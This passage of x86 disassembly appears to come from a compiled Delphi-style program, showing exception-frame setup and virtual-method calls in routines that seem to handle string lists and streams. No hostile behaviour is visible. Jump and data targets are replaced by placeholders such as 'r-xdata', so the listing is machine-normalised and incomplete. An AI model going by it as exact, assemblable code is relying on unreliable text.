mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_418a9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4184a8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_418b1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418b48
mov eax esi
call sub_418bec
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov edx edi
mov eax esi
call sub_418bf4
push eax
mov eax [ ebp - 0x4 ]
call sub_418a7c
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_418b48
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_418ba2
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_417f7c
call sub_40316c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_418bcc
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_418bf4
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_418c08
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_418cb6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_4030bc
lea edx [ ebp - 0x108 ]
mov eax edi
call sub_4041a4
mov eax ebx
mov si 0xffff
call sub_403368
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418cbd
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
mov eax ebx
mov si 0xffff
call sub_403368
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403368
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_418cd0
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_4042c0
sub_418cd0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_403f94
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_403368
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4033ac
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4033ac
call sub_4148e0
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
shl eax 0x2
call sub_4026dc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_418dcd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4033ac
mov edx [ ebp - 0xc ]
call sub_414a0c
movsx edi [ ebx + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4026fc
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp - 0x10 ]
call sub_414a60
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
lea edx [ esi + 0x1a ]
call sub_4041a4
sub_418dec
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4032f8
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_417d38
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_418b38
xor ecx ecx
mov edx esi
mov eax ebx
call sub_41879c
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_417e20
sub_418e54
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_417f7c
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418030
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_417d84
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_41879c
mov eax ebx
call sub_418b38
pop edi
pop esi
pop ebx
retn
sub_418eb8
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_418edc
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_4189e4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_418f24
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419b60
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41847c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_418f54
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_418f78
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_418fa4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41904b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4190f4
xor eax eax
push ebp
push sub_41902e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419035
mov eax [ ebp - 0x4 ]
call sub_4191b0
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_41905c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4184a8
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4190f4
xor eax eax
push ebp
push sub_4190dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4191b0
retn
sub_41910c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4191c4
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_419164
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_4199f8
mov eax [ ebp - 0x8 ]
push eax
push sub_419ca8
push ebp
call sub_41910c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4191c4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419259
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419260
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f64
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_40434c
jne r-xdata
sub_419270
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_41926c
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
jmp sub_4038f8
sub_4192a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4192f0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405d94
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_419270
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4192f7
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_419300
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4193d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4190f4
xor eax eax
push ebp
push sub_4193b6
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4193bd
mov eax [ ebp - 0x4 ]
call sub_4191b0
retn
sub_4193e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_419457
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx edi
call sub_403f94
mov eax esi
call sub_419d38
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404128
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_40c6a4
test eax eax
je r-xdata
mov eax ebx
xor edx edx
call sub_40458c
mov edx eax
dec edx
mov eax ebx
call sub_40458c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41945e
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_41946c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4194bd
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4193e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4194c4
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
sub_4194d0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_419515
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404400
call sub_408c5c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41951c
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_419524
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41962f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_403fd8
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_404030
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419636
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f64
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_404200
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_404200
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_404200
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028d8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028d8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_404200
mov ebx eax
test ebx ebx
je r-xdata
sub_41964c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4196c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4196cb
lea eax [ ebp - 0xc ]
call sub_403f40
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_4196d8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41979b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404460
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_419d38
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404128
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c6a4
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4197a2
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f64
lea eax [ ebp - 0xc ]
call sub_403f40
retn
sub_4197ac
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_4197e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_419810
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41a874
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419858
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41985f
mov eax [ ebp - 0x4 ]
call sub_40316c
retn
sub_419864
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419901
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4190f4
xor eax eax
push ebp
push sub_4198e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41a3c0
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_404030
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4198eb
mov eax [ ebp - 0x4 ]
call sub_4191b0
retn
sub_419910
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4199b1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4199b8
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
mov eax [ ebp - 0x4 ]
call sub_4190f4
xor eax eax
push ebp
push sub_419994
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4191b0
retn
sub_4199c0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4199f8
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419a9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41c5b0
mov eax [ ebp - 0x4 ]
call sub_4190f4
xor eax eax
push ebp
push sub_419a77
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41b64c
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d250
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a7e
mov eax [ ebp - 0x4 ]
call sub_4191b0
retn
sub_419aa8
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41a874
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419af3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419afa
mov eax [ ebp - 0x4 ]
call sub_40316c
retn
sub_419b00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419b4d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404200
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41a624
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419b54
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_419b60
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4058e8
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_419b94
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419bd7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404138
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
